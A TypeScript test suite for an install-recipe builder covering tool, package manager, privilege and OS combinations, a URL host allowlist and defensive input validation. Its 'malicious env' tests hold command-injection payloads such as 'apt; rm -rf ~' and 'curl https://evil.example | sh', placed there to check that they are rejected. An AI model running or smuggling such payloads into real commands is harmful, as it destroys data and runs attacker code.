/**
 * T0409: install recipe matrix (tool × pkgManager × privilege × musl × os), key cases,
 * URL host allowlist and malicious-env handling.
 */
import { describe, expect, it } from 'vitest'
import { readFileSync } from 'node:fs'
import { join } from 'node:path'
import {
  ALLOWED_URL_HOSTS,
  INTEGRITY_KEYS,
  LOCATION_KEYS,
  NOTE_KEYS,
  UNSUPPORTED_REASONS,
  buildInstallPlan,
  buildUpdatePlan,
  isInstallPlan,
  type InstallPlan,
  type RecipeEnv,
  type RecipeResult,
} from '../recipes'
import {
  REMOTE_OS_FAMILIES,
  REMOTE_PKG_MANAGERS as PKG_MANAGERS,
  REMOTE_PRIVILEGES as PRIVILEGES,
  REMOTE_TOOL_IDS,
  type RemoteToolId,
} from '../../../types/remote-tools'

const linux = (pkgManager: RecipeEnv['pkgManager'], privilege: RecipeEnv['privilege'], musl = false): RecipeEnv => ({
  osFamily: 'linux',
  pkgManager,
  privilege,
  musl,
})

function plan(toolId: RemoteToolId, env: RecipeEnv): InstallPlan {
  const result = buildInstallPlan(toolId, env)
  if (!isInstallPlan(result)) throw new Error(`expected a plan, got ${JSON.stringify(result)}`)
  return result
}

function allEnvs(): RecipeEnv[] {
  const envs: RecipeEnv[] = []
  for (const osFamily of REMOTE_OS_FAMILIES)
    for (const pkgManager of PKG_MANAGERS)
      for (const privilege of PRIVILEGES)
        for (const musl of [false, true]) envs.push({ osFamily, pkgManager, privilege, musl })
  return envs
}

function allResults(): Array<{ toolId: RemoteToolId; env: RecipeEnv; result: RecipeResult }> {
  const out: Array<{ toolId: RemoteToolId; env: RecipeEnv; result: RecipeResult }> = []
  for (const toolId of REMOTE_TOOL_IDS) {
    for (const env of allEnvs()) {
      out.push({ toolId, env, result: buildInstallPlan(toolId, env) })
      out.push({ toolId, env, result: buildUpdatePlan(toolId, env) })
    }
  }
  return out
}

const URL_RE = /https?:\/\/[^\s'"`)]+/g

function urlsOf(result: RecipeResult): string[] {
  const texts = isInstallPlan(result)
    ? [result.command, result.docsUrl, result.scriptUrl ?? '', ...(result.prerequisites ?? [])]
    : [result.docsUrl ?? '']
  return texts.flatMap((t) => t.match(URL_RE) ?? [])
}

describe('buildInstallPlan — key cases', () => {
  it('claude: user-space install.sh, no sudo, even when sudo needs a password', () => {
    for (const privilege of PRIVILEGES) {
      const p = plan('claude', linux('apt', privilege))
      expect(p.command).toBe('curl -fsSL https://claude.ai/install.sh | bash -s stable')
      expect(p.needsSudo).toBe(false)
      expect(p.scriptUrl).toBe('https://claude.ai/install.sh')
      expect(p.docsUrl).toBe('https://code.claude.com/docs/en/setup')
      expect(p.installLocation).toBe('remoteTools.location.userLocalBin')
      expect(p.installPath).toBe('~/.local/bin/claude')
      expect(p.integrity).toBe('remoteTools.integrity.claudeManifestSha256')
      expect(p.prerequisites).toBeUndefined()
    }
  })

  it('codex / uv: vendor install.sh into ~/.local/bin', () => {
    expect(plan('codex', linux('apt', 'password-required')).command).toBe('curl -fsSL https://chatgpt.com/codex/install.sh | sh')
    expect(plan('codex', linux('apt', 'password-required')).notes).toContain('remoteTools.note.codexEditsProfile')
    expect(plan('uv', linux('dnf', 'sudo-missing')).command).toBe('curl -LsSf https://astral.sh/uv/install.sh | sh')
    expect(plan('uv', { osFamily: 'darwin', pkgManager: 'none', privilege: 'passwordless', musl: false }).needsSudo).toBe(false)
  })

  it('Alpine claude: apk prerequisites chained before the installer', () => {
    const asUser = plan('claude', linux('apk', 'password-required', true))
    expect(asUser.prerequisites).toEqual(['sudo apk add bash curl libgcc libstdc++ ripgrep'])
    expect(asUser.command).toBe('sudo apk add bash curl libgcc libstdc++ ripgrep && curl -fsSL https://claude.ai/install.sh | bash -s stable')
    expect(asUser.needsSudo).toBe(true)
    expect(asUser.notes).toContain('remoteTools.note.alpineUseSystemRipgrep')

    const asRoot = plan('claude', linux('apk', 'root', true))
    expect(asRoot.prerequisites).toEqual(['apk add bash curl libgcc libstdc++ ripgrep'])
    expect(asRoot.command).toBe('apk add bash curl libgcc libstdc++ ripgrep && curl -fsSL https://claude.ai/install.sh | bash -s stable')
    expect(asRoot.needsSudo).toBe(false)

    expect(buildInstallPlan('claude', linux('apk', 'sudo-missing', true))).toEqual({
      unsupported: 'needs-root-no-sudo',
      docsUrl: 'https://code.claude.com/docs/en/setup',
    })
  })

  it('musl without apk: claude unsupported (runtime deps cannot be installed)', () => {
    expect(buildInstallPlan('claude', linux('none', 'root', true))).toEqual({
      unsupported: 'musl-without-apk',
      docsUrl: 'https://code.claude.com/docs/en/setup',
    })
  })

  it('Alpine gh: community package, flagged unofficial', () => {
    const p = plan('gh', linux('apk', 'root', true))
    expect(p.command).toBe('apk add github-cli')
    expect(p.unofficial).toBe(true)
    expect(p.needsSudo).toBe(false)
    expect(plan('gh', linux('apk', 'passwordless', true)).command).toBe('sudo apk add github-cli')
  })

  it('gh elsewhere is the official signed repo, never flagged unofficial', () => {
    for (const pm of ['apt', 'dnf', 'yum', 'brew'] as const) {
      const p = plan('gh', linux(pm, 'passwordless'))
      expect(p.unofficial).toBeUndefined()
    }
    const apt = plan('gh', linux('apt', 'passwordless'))
    expect(apt.integrity).toBe('remoteTools.integrity.ghRepoGpg')
    expect(apt.command).toContain('https://cli.github.com/packages/githubcli-archive-keyring.gpg')
    expect(apt.command).toContain('signed-by=/etc/apt/keyrings/githubcli-archive-keyring.gpg] https://cli.github.com/packages stable main')
    expect(apt.command.endsWith('sudo apt-get install -y gh')).toBe(true)
    expect(plan('gh', linux('dnf', 'password-required')).command).toBe(
      'sudo curl -fsSL -o /etc/yum.repos.d/gh-cli.repo https://cli.github.com/packages/rpm/gh-cli.repo && sudo dnf install -y gh',
    )
    expect(plan('gh', linux('yum', 'root')).command).toBe(
      'curl -fsSL -o /etc/yum.repos.d/gh-cli.repo https://cli.github.com/packages/rpm/gh-cli.repo && yum install -y gh',
    )
  })

  it('root drops every sudo prefix (Docker: root without a sudo binary)', () => {
    expect(plan('git', linux('apt', 'root')).command).toBe('apt-get update && apt-get install -y git')
    const gh = plan('gh', linux('apt', 'root'))
    expect(gh.command).not.toMatch(/\bsudo\b/)
    expect(gh.needsSudo).toBe(false)
  })

  it('password-required keeps sudo (the user answers the prompt in the tab)', () => {
    const p = plan('git', linux('apt', 'password-required'))
    expect(p.command).toBe('sudo apt-get update && sudo apt-get install -y git')
    expect(p.needsSudo).toBe(true)
    expect(plan('git', linux('dnf', 'passwordless')).command).toBe('sudo dnf install -y git')
    expect(plan('git', linux('yum', 'passwordless')).command).toBe('sudo yum install -y git')
    expect(plan('git', linux('apk', 'passwordless', true)).command).toBe('sudo apk add git')
  })

  it('sudo-missing: root-only recipes are unsupported, user-space ones still work', () => {
    for (const tool of ['git', 'gh', 'rg'] as const) {
      expect(buildInstallPlan(tool, linux('apt', 'sudo-missing'))).toMatchObject({ unsupported: 'needs-root-no-sudo' })
    }
    expect(plan('claude', linux('apt', 'sudo-missing')).needsSudo).toBe(false)
  })

  it('macOS without brew: git is manual-only (xcode-select is a GUI dialog)', () => {
    expect(buildInstallPlan('git', { osFamily: 'darwin', pkgManager: 'none', privilege: 'passwordless', musl: false })).toEqual({
      unsupported: 'manual-only',
      docsUrl: 'https://git-scm.com/install/mac',
    })
    expect(buildInstallPlan('git', linux('none', 'root'))).toEqual({
      unsupported: 'no-package-manager',
      docsUrl: 'https://git-scm.com/install/linux',
    })
  })

  it('brew: no sudo, refuses root', () => {
    const mac: RecipeEnv = { osFamily: 'darwin', pkgManager: 'brew', privilege: 'password-required', musl: false }
    expect(plan('git', mac)).toMatchObject({ command: 'brew install git', needsSudo: false, installLocation: 'remoteTools.location.homebrew' })
    expect(plan('gh', mac).command).toBe('brew install gh')
    expect(plan('rg', mac).command).toBe('brew install ripgrep')
    expect(buildInstallPlan('git', { ...mac, privilege: 'root' })).toMatchObject({ unsupported: 'brew-as-root' })
  })

  it('rg: package is ripgrep; RHEL family notes EPEL', () => {
    expect(plan('rg', linux('apt', 'passwordless')).command).toBe('sudo apt-get update && sudo apt-get install -y ripgrep')
    expect(plan('rg', linux('dnf', 'passwordless')).notes).toEqual(['remoteTools.note.rgNeedsEpel'])
    expect(plan('rg', linux('apt', 'passwordless')).notes).toBeUndefined()
  })

  it('no install button for node / curl / bash / python3 (node links the nodejs.org guidance)', () => {
    expect(buildInstallPlan('node', linux('apt', 'root'))).toEqual({ unsupported: 'no-recipe', docsUrl: 'https://nodejs.org/en/download' })
    for (const tool of ['curl', 'bash', 'python3'] as const) {
      expect(buildInstallPlan(tool, linux('apt', 'root'))).toEqual({ unsupported: 'no-recipe' })
    }
  })
})

describe('buildUpdatePlan', () => {
  it('claude update for the system claude; nothing else in v1', () => {
    expect(buildUpdatePlan('claude', linux('apt', 'password-required'))).toMatchObject({
      toolId: 'claude',
      kind: 'update',
      command: 'claude update',
      needsSudo: false,
    })
    for (const tool of REMOTE_TOOL_IDS.filter((t) => t !== 'claude')) {
      expect(buildUpdatePlan(tool, linux('apt', 'root'))).toEqual({ unsupported: 'no-recipe' })
    }
  })
})

describe('recipe matrix invariants', () => {
  const results = allResults()

  it('covers every tool × os × pkgManager × privilege × musl, install and update', () => {
    expect(results).toHaveLength(REMOTE_TOOL_IDS.length * REMOTE_OS_FAMILIES.length * 6 * 4 * 2 * 2)
  })

  it('every result is a well-formed plan or a known unsupported reason', () => {
    for (const { toolId, result } of results) {
      if (isInstallPlan(result)) {
        expect(result.toolId).toBe(toolId)
        expect(result.command).not.toMatch(/[\r\n]/)
        expect(result.command.trim()).toBe(result.command)
        expect(INTEGRITY_KEYS).toContain(result.integrity)
        expect(LOCATION_KEYS).toContain(result.installLocation)
        for (const note of result.notes ?? []) expect(NOTE_KEYS).toContain(note)
        for (const pre of result.prerequisites ?? []) expect(result.command.startsWith(`${pre} && `)).toBe(true)
      } else {
        expect(UNSUPPORTED_REASONS).toContain(result.unsupported)
      }
    }
  })

  it('needsSudo ⇔ command uses sudo; root and sudo-missing never emit sudo', () => {
    for (const { env, result } of results) {
      if (!isInstallPlan(result)) continue
      expect(/\bsudo\b/.test(result.command)).toBe(result.needsSudo)
      if (env.privilege === 'root' || env.privilege === 'sudo-missing') expect(result.needsSudo).toBe(false)
    }
  })

  it('snapshot of the Linux matrix (musl only on apk)', () => {
    const lines: string[] = []
    for (const toolId of REMOTE_TOOL_IDS)
      for (const pkgManager of PKG_MANAGERS)
        for (const privilege of PRIVILEGES) {
          const r = buildInstallPlan(toolId, linux(pkgManager, privilege, pkgManager === 'apk'))
          lines.push(`${toolId} ${pkgManager} ${privilege} → ${isInstallPlan(r) ? `${r.unofficial ? '[unofficial] ' : ''}${r.command}` : `unsupported:${r.unsupported}`}`)
        }
    expect(lines.join('\n')).toMatchSnapshot()
  })
})

describe('URL host allowlist', () => {
  function hostAllowed(url: string): boolean {
    return ALLOWED_URL_HOSTS.includes(new URL(url).hostname)
  }

  it('every URL in every generated plan uses https and an allowlisted host', () => {
    const seen = new Set<string>()
    for (const { result } of allResults()) for (const url of urlsOf(result)) seen.add(url)
    expect(seen.size).toBeGreaterThan(5)
    for (const url of seen) {
      expect(url.startsWith('https://'), url).toBe(true)
      expect(hostAllowed(url), url).toBe(true)
    }
  })

  it('every URL literal in recipes.ts uses an allowlisted host', () => {
    const source = readFileSync(join(process.cwd(), 'src/lib/remote-tools/recipes.ts'), 'utf8')
    const urls = source.match(URL_RE) ?? []
    expect(urls.length).toBeGreaterThan(5)
    for (const url of urls) {
      expect(url.startsWith('https://'), url).toBe(true)
      expect(hostAllowed(url), url).toBe(true)
    }
  })
})

describe('malicious env', () => {
  const PAYLOADS = ['apt; rm -rf ~', '$(id)', '`id`', 'root && curl https://evil.example | sh', 'linux\n', '']
  const base = linux('apt', 'passwordless')

  it('non-enum values in any field throw without echoing the value', () => {
    for (const payload of PAYLOADS) {
      for (const field of ['osFamily', 'pkgManager', 'privilege'] as const) {
        const env = { ...base, [field]: payload } as unknown as RecipeEnv
        expect(() => buildInstallPlan('git', env)).toThrow(TypeError)
        expect(() => buildUpdatePlan('claude', env)).toThrow(TypeError)
        try {
          buildInstallPlan('git', env)
        } catch (err) {
          if (payload) expect((err as Error).message).not.toContain(payload)
        }
      }
      expect(() => buildInstallPlan(payload as RemoteToolId, base)).toThrow(TypeError)
    }
  })

  it('musl must be a real boolean; env must be an object', () => {
    expect(() => buildInstallPlan('claude', { ...base, musl: 'true' } as unknown as RecipeEnv)).toThrow(TypeError)
    expect(() => buildInstallPlan('claude', { ...base, musl: '$(id)' } as unknown as RecipeEnv)).toThrow(TypeError)
    expect(() => buildInstallPlan('claude', null as unknown as RecipeEnv)).toThrow(TypeError)
    expect(() => buildInstallPlan('claude', '$(id)' as unknown as RecipeEnv)).toThrow(TypeError)
  })

  it('prototype-ish and look-alike enum values are rejected', () => {
    for (const pkgManager of ['APT', ' apt', 'apt ', 'toString', '__proto__', 'constructor']) {
      expect(() => buildInstallPlan('git', { ...base, pkgManager } as unknown as RecipeEnv)).toThrow(TypeError)
    }
  })

  it('extra server-reported strings are ignored: output identical, never interpolated', () => {
    const tainted = {
      ...base,
      version: '$(curl https://evil.example | sh)',
      path: '/tmp/x; rm -rf ~',
      id: 'ubuntu`id`',
    } as unknown as RecipeEnv
    for (const toolId of REMOTE_TOOL_IDS) {
      const clean = buildInstallPlan(toolId, base)
      const dirty = buildInstallPlan(toolId, tainted)
      expect(dirty).toEqual(clean)
      const text = JSON.stringify(dirty)
      expect(text).not.toContain('evil.example')
      expect(text).not.toContain('rm -rf')
      expect(text).not.toContain('`id`')
    }
  })
})
